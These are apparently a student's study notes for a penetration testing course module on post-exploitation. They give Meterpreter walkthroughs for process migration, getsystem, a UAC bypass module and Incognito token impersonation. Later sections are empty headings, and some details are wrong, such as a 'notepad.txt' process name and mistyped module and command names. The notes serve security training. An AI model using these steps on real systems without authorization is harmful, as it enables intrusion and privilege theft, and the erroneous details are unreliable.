# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# Network Security
# Module 6 - Post Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_2/module_6/html/index.html

__________________________
###### Module Map
1. Introduction
2. Privilege Escalation and Maintaining Access
3. Pillaging
4. Mapping the internal network
5. Exploitation through Pivoting

__________________________
## 6.1. Introduction
Post-exploitation is the last technical stage of Penetration testing process (before reporting phase).

The Post Exploitation encompasses all the activities that the penetration tester undertakes when the target system has been compromised: determine the machine value and the network infrastructure, maintain access, gather information, and so on.

In other words, what you do, or have to do, when you get access on the target.

It is important to know that these activities are not always the same depending on what kind of access you have, what system you have compromised, how stealthy you need to be, and so on.

This means that we will run different activities, task, and tools on Windows and Linux OS.

Moreover, you should never forget about the rules of the engagement.

When running post-exploitation tasks, be sure you have the permissions, and the right to modify services, machine configurations, escalate privileges, gather sensitive information, delete logs, and so on.

###### Record your changes
  You should always keep track of actions taken against the compromised machines. This includes date and time, changes made to machines documents, services, applications, and configurations, but also private data discovered, methods used to maintain access, and so on.

  This information (containing the list of changes made) should then be included in the final report.

###### Handling Information
  All data discovered and gathered must be protected. This means that you must encrypt it on your pentesting machine, and permanently delete it once the pentest is completed.

  Even when reporting sensitive information to your client, such as a screenshot containing username or passwords, be sure to always obfuscate and mask data.

###### Maintaining Access Clean-up
  As you will see later on, one of the first steps you will run once you compromise a machine is *maintain access* or persistence. It allows you to get back on the machine whenever you want: usually a backdoor on the system.

  When using such methods, implement some type of authentication (in order to avoid others from using it) and delete everything once the pentest is complete.

###### Permanent Edits
  Another important thing you should be aware of is how to handle permanent changes on the exploited system.

  If the rule of engagements permits these edits, and if you are going to delete logs from the remote machine, be sure to back them up before actually deleting or modifying them.

###### Methodology
In order to run a thorough and complete post-exploitation phase, we propose a methodology that you can apply during your engagements.

  This is a cyclic process composed of 4 steps.
    1. Privilege Escalation and Maintaining Access
    2. Data Harvesting
    3. Internal Network Scan
    4. Exploitation of New Systems and Pivoting

  Note that this is a cyclic process due to the fact that you could discover new networks, new hosts, new targets, and then get access to them trough exploitation.

  Moreover, note that each host you compromise can store and provide information that others do not store.

  The post-exploitation phase really allows you to infiltrate an entire network instead of just a single host.

In the next section, we will analyze each step in the process and see what tools, commands, and activities a penetration tester can use in each step of the Post-Exploitation process.

__________________________
## 6.2. Privilege Escalation and Maintaining Access
The first task is to perform **Privilege Escalation and Maintaining Access**.

Before actually seeing the attack methods and techniques that we can use in this phase, let's shine some light on what we mean with privilege escalation, what types of privilege escalation exist and what local exploits are (we introduced them in the previous module)

#### 6.2.1. Privilege Escalation
Privilege Escalation is an attack that exploits OS or third-party software vulnerabilities (bugs, design flaws, etc.) in order to elevate the current access (privileges) to protected resources.

  In other words, the attacker is able to gain unauthorized access to resources that (s)he is not supposed to access.

Types of Privilege Escalation:
 - Vertical <br>
    The attacker is able to move from a lower-privileged user to a higher privileged user. For example from a low-end user to administration or root user.

    Example:<br>
      On a Linux OS, the attacker is able to escalate privileges from a user (i.e. applications) and gain root privileges

 - Horizontal <br>
    The attacker keeps the same set or level of privileges, but assumes the identity of a different user (he/she does not gain any further privilege)

    Example: <br>
      On a Windows OS, the attacker is able to assume the identity on any other *Standard User* on the system. The attacker is not escalating privileges from a Standard User to an Administrator User.

###### Local Exploit
  In the previous module, we explained client-side and remote exploits, but also introduced local exploits. Now let's see what these exploits are.

  Different from the other two, local exploits require prior access on the target system. Their goal is to exploit operating systems or applications vulnerabilities in order to increase privileges on the target machine.

Now that we know more about privilege escalation and local exploit, let us go back to our pen-testing process.
  The purpose of this phase is to **provide and secure access** to the target machine with the **highest privilege** on the machine.
  In the next steps, we will assume to already have a shell or a meterpreter session on our target.

To get some basic information on the current meterpreter session, we can run `sysinfo` command.
  Let's run it and see what we get.

  As you can see, we can read about the computer name (`ELS`), the current OS running on the exploited machine (Windows), its architecture (`x64`), domain name (`workgroup`), and also the architecture of the current meterpreter session process (`x86/win32`)
    ```
    meterpreter > sysinfo
    Computer        : ELS
    OS              : Windows 7 (Build 7601, Service Pack 1)
    Architecture    : x64 (Current Process is WOW64)
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/win32
    ```

  As you can imagine, there are many other commands and tools that we can use to get similar or more detailed information. For example, when dealing with a Windows machine we may want to run `systeminfo`, while on Linux machine we have plenty of commands to use: `lsb_release`, `uname`, `lscpu`, and more.

  We will inspect these later on, once we get a stable and persistent connection to the exploited machine.


Once we know the type of machine we are dealing with, we can thinking about our maintaining access activities.
  In this phase we will make sure that our session is:
    - Stable (does not get dropped)
    - Privileged (can run with high privileges)
    - Persistent (through reboots)

###### 6.2.1.1 Stable
One of the main issues when you get a meterpreter session on the target, is that the end user can kill the exploited process.
  It can happen, for example, when you exploit a client-side vulnerability through the web browser and the user just closes the web browser window.

  To avoid losing the session on the target, one of the first tasks to perform is to migrate the session to another process.

**Helpful commands**
  Before seeing the migrate command, it is useful to know that giving `help` command in meterpreter, or simply typing `?` and hitting enter, will list all commands and options.

  Moreover, we have very useful meterpreter scripts that we can execute during this phase of our penetration test.
    We can list them by typing `run` and then pressing `Tab` twice.

Back to our goal of making our session stable.
To let Metasploit automatically migrate to another process, you can use the following command (on Windows machine):
  ```
  run post/windows/manage/migrate
  ```
  Example:
    ```
    meterpreter > getpid
    Current pid: 2168
    meterpreter > run post/windows/manage/migrate

    [*] Running module against ELS
    [*] Current server process: win10.exe (2168)
    [*] Migrating to 1564
    [*] Successfully migrated to process 1564
    meterpreter > getpid
    Current pid: 1564
    meterpreter >
    ```

  As you can see, the meterpreter script automatically migrated to another process. It is important to know that the process on which it will migrate will always be a process with the same privileges as the current session and that the process name is `notepad.txt`.

  If we want to see the list of all process running on the machine we can execute the `ps` command (even if it is a Windows machine)

  Tip:
    Although the previous command works just fine, we can directly run `migrate` in the meterpreter session. This time however, we have to provide the process ID or the process name we want to migrate to.

    It will not automatically create and migrate to a new process.

    ```
    meterpreter > migrate -h
    Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]

    Migrates the server instance to another process.
    NOTE: Any open channels or other dynamic state will be lost.
    ```

###### 6.2.1.2. Privilege Escalation
Once we have migrated our session, we can start our Post-Exploitation process.
We will first want to make our access to the remote host persistent, in order to come back any time and have access to the machine.

However, most of the operations required to achieve a persistent access, also require our shell to run with the highest privileges.

Types of Privilege Escalation Based on its OS:
  1. Windows Privilege Escalation  
      The easiest and fastest way to get higher privileges is by running `getsystem` within meterpreter.
        It will automatically find the best technique to elevate privileges.

        By default, the `getsystem` tries all available techniques to escalate privileges.
        If a technique fails, it w ill try the next one until one of the available techniques works.

        If you want to run a specific technique, simply use the `-t` option as follow:
         ```
         getsystem -t 1
         ```

        Important:
          Notice that depending on the current privileges on the machine, the `getsystem` command may fail.
            For example, if you use this technique on systems with User Account Control (UAC) enabled (Windows Vista+), it would not work as well as systems like Windows XP.

            We need to use other techniques to get past this protection and then be able to successfully obtain system privileges.

          Moreover, you should be aware that `getsystem` works only against Windows OS.
          For different OS, you will have to rely on different Metasploit modules.

          If you want to know which modules Metasploit offers, you can navigate the `exploit/[OS]/local` path. We will see some of them later in the module.

        When UAC is enabled on the remote system, `bypassuac` is one of the modules we can use to bypass it.
          First of all, we can verify if UAC is enabled by running the module `post/windows/gather/win_privs`.

          If in the result the *UAC Enabled* column is set to true, it means that the remote system has the UAC enabled.

          As we can see in the following snapshot, UAC is enabled and we do not have Admin or System privilege on the machine. This means that running `getsystem` will most likely fail.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            False       False       True          1               "els\\els"

            Windows Privileges
            ==================

            Name
            ----
            SeChangeNotifyPrivilege
            SeShutdownPrivilege
            SeUndockPrivilege
            ```
          What we can do then is use some of the modules offered by Metasploit to bypass the UAC protection mechanism. We can list them by simply searching the string `bypassuac`:
            ```
            msf exploit(handler) > search bypassuac

            Matching Modules
            ================

              Name                                      Disclosure Date   Rank  Description
              ----                                      ---------------   ----  -----------
              exploit/windows/local/bypassuac           2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_injection 2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_vbs       2015-08-22        excellent  Windows Escalate UAC Protection
            ```

          The steps we will have to do are very easy:
            1. Select the `bypassuac_vbc` module, since it is the newest module
            2. Set the session ID on which the module will be executed
            3. Run the module

          If the module completes, we will get a new meterpreter session with highest privileges. Remember that this is a bypass, so UAC will still be enabled on  the target.

          The following summarized the step:
            ```
            msf exploit(handler) > user exploit/windows/local/bypassuac_vbs
            msf exploit(bypassuac_vbs) > sessions

            Active sessions
            ===============

              Id  Type                    Information     Connection
              --  ----                    -----------     ----------
              6   meterpreter x86/win32   elsels @ELS     192.168.102.147:4455 -> 192.168.102.157:1039 (192.168.102.157)

            msf exploit(bypassuac_vbs) > set SESSION 6
            SESSION => 6
            msf exploit(bypassuac_vbs) > exploit
            ```

          If the exploit succeed, we will obtain a new meterpreter session that has higher privileges on the machine. As we can see, running `win_priv` prints out we are Admin on it.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            True        False       True          1               "els\\els"
            ```

          We now have administrator privileges on the machine, but we do not yet have the highest privileges on the machine.
            What we can do is run `getsystem` once again in this new meterpreter session. This time it will work.
              ```
              meterpreter > getsystem
              ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > sysinfo
              Computer        : ELS
              OS              : Windows 7 (Build 7601, Service Pack 1)
              Architecture    : x64 (Current Process is WOW64)
              System Language : en_US
              Domain          : WORKGROUP
              ```

          **Incognito**
            A very powerful Meterpreter extension that we can use in this phase is [Incognito][https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/].
            It was a standalone tool used to demonstrate security issues affecting [Windows tokens][https://technet.microsoft.com/en-us/library/cc759267(v=ws.10).aspx], but due to its functionality and features, it has been integrated in Metasploit.

            Thanks to incognito, we can impersonate other valid user tokens on that machine and became that user. The best thing is that we do not need to know or crack passwords to do this.

            As you can imagine, being able to switch from one user to another gives us the possibility to access different local or domain resources.

            Loading incognito is very simple. Once we have a meterpreter session (better with system privileges), we can run the following command to load the incognito extension
              ```
              meterpreter > use incognito
              Loading extension incognito...success.

              Incognito Commands
              ==================
                  Command             Description
                  -------             -----------
                  add_group_user      Attempt to add a user to a global group with all tokens
                  add_localgroup_user Attempt to add a user to a local group with all tokens
                  add_user            Attempt to add a user with all tokens
                  impersonate_token   Impersonate specified token
                  list_tokens         List tokens available under current user context
                  snarf_hashes        Snarf challenge/response hashes for every token
              ```

            Now we wcan list all available tokens with `list_tokens` or impersonate other user with `impersonate_token`:
              ```
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > list_tokens -u

              Delegation Tokens Available
              ================================================
              els\els
              els\user
              NT AUTHORITY\LOCAL SERVICE
              NT AUTHORITY\NETWORK SERVICE
              NT AUTHORITY\SYSTEM

              Impersonate Tokens Available
              ================================================
              NT AUTHORITY\ANONYMOUS LOGON
              ```

  2. Linux Privilege Escalation



###### 6.2.1.3. Maintenance Access

__________________________
## 6.3. Pillaging


__________________________
## 6.4. Mapping the internal network


__________________________
## 6.5. Exploitation through Pivoting


__________________________
